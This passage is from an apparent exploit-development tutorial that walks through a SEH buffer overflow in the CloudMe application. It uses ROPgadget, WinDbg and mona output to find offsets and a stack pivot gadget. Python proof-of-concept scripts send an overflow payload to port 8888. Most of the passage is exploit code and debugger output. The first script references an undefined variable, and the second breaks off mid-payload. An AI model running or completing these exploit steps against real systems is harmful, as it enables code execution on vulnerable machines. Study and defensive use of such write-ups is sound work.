<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
pentest@pentest-PC MINGW32 ~/Desktop/ROPgadget (master)
$ python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll" --only "ret" --depth 5 --badbytes "00"
Gadgets information
============================================================
<span style="color:#ff0000;">0x6d9c1011 : ret</span>
0x6d9c35b1 : ret 0
0x6d9cf7e4 : ret 0x10
0x6d9d782a : ret 0x11b
0x6d9d9c6a : ret 0x125
[...]
</pre>

<p align="justify">Using the <b>ROPgadget</b> tool ( clone from <a href="https://github.com/JonathanSalwan/ROPgadget">here </a>), we have chosen to search for gadgets from <b>Qt5Sql.dll</b>. The gadget we want to search is the <b>ret</b> instruction</p>

```python

import struct
import socket
import sys
target = "127.0.0.1"

payload= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"
payload+="c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A"
payload+="e6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0A"
payload+="h1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5A"
payload+="j6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0A"
payload+="m1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5A"
payload+="o6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0A"
payload+="r1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5A"
payload+="t6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A"
payload+="w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5A"
payload+="y6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0B"
payload+="b1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5B"
payload+="d6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0B"
payload+="g1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5B"
payload+="i6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0B"
payload+="l1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5B"
payload+="n6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0B"
payload+="q1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5B"
payload+="s6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0B"
payload+="v1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5B"
payload+="x6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0C"
payload+="a1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5C"
payload+="c6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0C"
payload+="f1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5C"
payload+="h6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0C"
payload+="k1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5C"
payload+="m6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0C"
payload+="p1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5C"
payload+="r6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0C"
payload+="u1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5C"
payload+="w6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0C"
payload+="z1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5D"
payload+="b6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0D"
payload+="e1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5D"
payload+="g6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0D"
payload+="j1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5D"
payload+="l6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0D"
payload+="o1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5D"
payload+="q6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0D"
payload+="t1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5D"
payload+="v6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0D"
payload+="y1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5E"
payload+="a6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0E"
payload+="d1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5E"
payload+="f6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0E"
payload+="i1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5E"
payload+="k6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0E"
payload+="n1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5E"
payload+="p6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0E"
payload+="s1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5E"
payload+="u6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0E"
payload+="x1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5E"
payload+="z6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0F"
payload+="c1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5F"
payload+="e6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0F"
payload+="h1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5F"
payload+="j6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0F"
payload+="m1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5F"
payload+="o6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0F"
payload+="r1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5F"
payload+="t6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0F"
payload+="w1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5F"
payload+="y6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0G"
payload+="b1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5G"
payload+="d6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0G"
payload+="g1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5G"
payload+="i6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

payload = pattern[:2236]

seh = struct.pack('L',0x6d9c1011) # RET

payload = payload + seh

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,8888))
  s.send(payload)
except Exception as e:
  print(sys.exc_value)
```

<p align="justify">The following address <b>0x6d9c1011</b> was selected with the only purpose of setting a breakpoint in order to calculate <b>ESP</b> relative offset once we hit it. At this point we use the first 2236 bytes to get to <b>SEH</b>.</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> bp 0x6d9c1011
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll - 
0:000> bl 
 0 e 6d9c1011     0001 (0001)  0:**** Qt5Sql+0x1011
</pre>

<p align="justify">Following, we load the payload and continue execution until we hit the breakpoint</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6d9c1011 edx=779e71cd esi=00000000 edi=00000000
eip=6d9c1011 esp=0022cf18 ebp=0022cf38 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
Qt5Sql+0x1011:
6d9c1011 c3              ret
</pre>

<p align="justify">As we see above, after hitting the breakpoint, the <b>ESP</b> is pointing to <b>0x0022cf18</b>. Now lets look at the stack to locate the beginning of the payload. In order to search for the beginning of the payload we will use the <b>ESP</b> value at the time of crash which is <b>0x0022d470</b> .After looking throughout the stack we have located the beginning of the payload at the following location (<b>0x0022d050</b>):</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000&gt; dd 0022d470-500 L 50 
0022cf70  00000000 00987898 00000000 00000000
0022cf80  04ace4d8 047e19d8 00000001 00000162
0022cf90  00000000 01003630 00000000 00000710
0022cfa0  0101cfdc 0022cedc 68c70e70 0022d018
0022cfb0  779be0ed 0152ba85 fffffffe 779f6570
0022cfc0  779f65a6 00000000 04ace4d8 04ace4d8
0022cfd0  0022d04c 01d2f4e8 04ace4d0 0022d028
0022cfe0  77b198cd 00980000 00000000 77b198da
0022cff0  bf39339a 0022d04c 0022d050 01d2f4e8
0022d000  01d2f4e8 0022d04c 0022d468 68c6eb70
0022d010  0022cff0 01d2f698 0022d908 77b38cd5
0022d020  c8aa7b52 fffffffe 77b198da 005658d8
0022d030  04ace4d8 00000002 00000004 00acf558
0022d040  00acf564 00acef50 00000001 04ace4d8
0022d050  <span style="color:#ff0000;">41306141</span> 61413161 33614132 41346141
0022d060  61413561 37614136 41386141 62413961
0022d070  31624130 41326241 62413362 35624134
0022d080  41366241 62413762 39624138 41306341
0022d090  63413163 33634132 41346341 63413563
0022d0a0  37634136 41386341 64413963 31644130
0:000> !py mona pattern_offset 41306141 
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py pattern_offset 41306141
Looking for Aa0A in pattern of 500000 bytes
 - Pattern Aa0A (0x41306141) found in cyclic pattern at position 0
Looking for Aa0A in pattern of 500000 bytes
Looking for A0aA in pattern of 500000 bytes
 - Pattern A0aA not found in cyclic pattern (uppercase)  
Looking for Aa0A in pattern of 500000 bytes
Looking for A0aA in pattern of 500000 bytes
 - Pattern A0aA not found in cyclic pattern (lowercase)  

[+] This mona.py action took 0:00:00.438000
</pre>

<p align="justify">As we can see from the execution above, the pattern was found at position 0. Furthermore, the address <b>0x0022d470</b> we've got at the time of crash, appears to be <b>1368</b> bytes away from <b>ESP</b> when hitting the breakpoint.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> ? 0022d470 - esp
Evaluate expression: 1368 = 00000558
</pre>

<p align="justify">So ideally, we need to find a gadget equivalent to <b>ADD ESP 558 ...POP ...POP ...RETN</b> to pivot precisely to the beginning of the payload. Nevertheless, any gadget with distance above &gt;1368 bytes will suit us. Next, in order to find a suitable stack pivot, we will use mona’s <strong>stackpivot</strong> searching functionality. At this point we will load CloudMe executable in <strong>WinDbg</strong> and then run the following command</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !py mona stackpivot -n -o -distance 1368
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py stackpivot -n -o -distance 1368

---------- Mona command started on 2021-02-15 17:59:46 (v2.0, rev 604) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
    - Ignoring OS modules
    - Ignoring pointers that have null bytes
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Preparing output file '_rop_progress_CloudMe.exe_3752.log'
    - (Re)setting logfile c:\logs\CloudMe\_rop_progress_CloudMe.exe_3752.log
[+] Progress will be written to _rop_progress_CloudMe.exe_3752.log
[+] Maximum offset : 40
[+] (Minimum/optional maximum) stackpivot distance : 1368
[+] Max nr of instructions : 6
[+] Split output into module rop files ? False
[+] Enumerating 22 endings in 10 module(s)...
    - Querying module Qt5Core.dll
    - Querying module CloudMe.exe
      !Skipped search of range 007bf000-00815000 (Has nulls)
      !Skipped search of range 005ac000-00659000 (Has nulls)
      !Skipped search of range 005a9000-005ac000 (Has nulls)
      !Skipped search of range 00401000-005a9000 (Has nulls)
      !Skipped search of range 007bd000-007bf000 (Has nulls)
    - Querying module Qt5Sql.dll
    - Querying module libstdc++-6.dll
    - Querying module libgcc_s_dw2-1.dll
    - Querying module libwinpthread-1.dll
    - Querying module Qt5Gui.dll
    - Querying module Qt5Xml.dll
    - Querying module qsqlite.dll
    - Querying module Qt5Network.dll
    - Search complete :
       Ending : RETN 0x18, Nr found : 230
       Ending : RETN 0x10, Nr found : 796
       Ending : RETN 0x12, Nr found : 3
       Ending : RETN 0x14, Nr found : 370
       Ending : RETN 0x16, Nr found : 10
       Ending : RETN 0x28, Nr found : 23
       Ending : RETN 0x0C, Nr found : 2301
       Ending : RETN 0x0A, Nr found : 10
       Ending : RETN, Nr found : 78134
       Ending : RETN 0x0E, Nr found : 6
       Ending : RETN 0x20, Nr found : 81
       Ending : RETN 0x08, Nr found : 4603
       Ending : RETN 0x24, Nr found : 49
       Ending : RETN 0x26, Nr found : 1
       Ending : RETN 0x02, Nr found : 93
       Ending : RETN 0x00, Nr found : 344
       Ending : RETN 0x06, Nr found : 28
       Ending : RETN 0x04, Nr found : 9457
       Ending : RETN 0x1A, Nr found : 1
       Ending : RETN 0x1C, Nr found : 298
       Ending : RETN 0x1E, Nr found : 9
       Ending : RETN 0x22, Nr found : 3
    - Filtering and mutating 96850 gadgets
      - Progress update : 1000 / 96850 items processed (Mon 2021/02/15 06:00:11 PM) - (1%)
      - Progress update : 2000 / 96850 items processed (Mon 2021/02/15 06:00:18 PM) - (2%)
      - Progress update : 3000 / 96850 items processed (Mon 2021/02/15 06:00:27 PM) - (3%)
      - Progress update : 4000 / 96850 items processed (Mon 2021/02/15 06:00:37 PM) - (4%)
      - Progress update : 5000 / 96850 items processed (Mon 2021/02/15 06:00:57 PM) - (5%)
      - Progress update : 6000 / 96850 items processed (Mon 2021/02/15 06:01:09 PM) - (6%)
      - Progress update : 7000 / 96850 items processed (Mon 2021/02/15 06:01:20 PM) - (7%)
      - Progress update : 8000 / 96850 items processed (Mon 2021/02/15 06:01:33 PM) - (8%)
      - Progress update : 9000 / 96850 items processed (Mon 2021/02/15 06:01:49 PM) - (9%)
[...snip...]
      - Progress update : 95000 / 96850 items processed (Mon 2021/02/15 06:17:02 PM) - (98%)
      - Progress update : 96000 / 96850 items processed (Mon 2021/02/15 06:17:11 PM) - (99%)
      - Progress update : 96850 / 96850 items processed (Mon 2021/02/15 06:17:18 PM) - (100%)
[+] Preparing output file 'stackpivot.txt'
    - (Re)setting logfile c:\logs\CloudMe\stackpivot.txt
[+] Writing stackpivots to file c:\logs\CloudMe\stackpivot.txt
    Wrote 170 pivots to file 
Done

[+] This mona.py action took 0:17:32.653000
</pre>

<p align="justify">After a few minutes, mona will generate <b>stackpivot.txt</b> file in its output directory. Here is one gadget that will send us to the beginning of the payload</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
Stack pivots, minimum distance 1368
------------------------------------
Non-SafeSEH protected pivots :
----------------------------
[..snip..] 
0x6998fb2e : {pivot 1916 / 0x77c} : <strong># ADD ESP,76C # POP EBX # POP ESI # POP EDI # 
POP EBP # RETN</strong> ** [Qt5Network.dll] ** | {PAGE_EXECUTE_WRITECOPY}  
[..snip..]
</pre>

<p align="justify">
As said before, we need gadgets equal or above the distance of 1368 bytes. As we see above, we have found a gadget with 1916 bytes distance from the beginning of our payload. Now lets create a python script in order to provide a proof of concept.
</p>


```python

import struct 
import socket
import sys 

target = "127.0.0.1" 

pattern= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"
pattern+="c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A" 
pattern+="e6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0A" 
pattern+="h1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5A" 
pattern+="j6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0A" 
pattern+="m1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5A" 
pattern+="o6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0A" 
pattern+="r1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5A" 
pattern+="t6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A" 
pattern+="w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5A" 
pattern+="y6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0B" 
pattern+="b1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5B" 
pattern+="d6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0B" 
pattern+="g1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5B" 
pattern+="i6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0B" 
pattern+="l1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5B" 
pattern+="n6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0B" 
pattern+="q1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5B" 
pattern+="s6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0B" 
pattern+="v1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5B" 
pattern+="x6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0C" 
pattern+="a1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5C" 
pattern+="c6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0C" 
pattern+="f1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5C" 
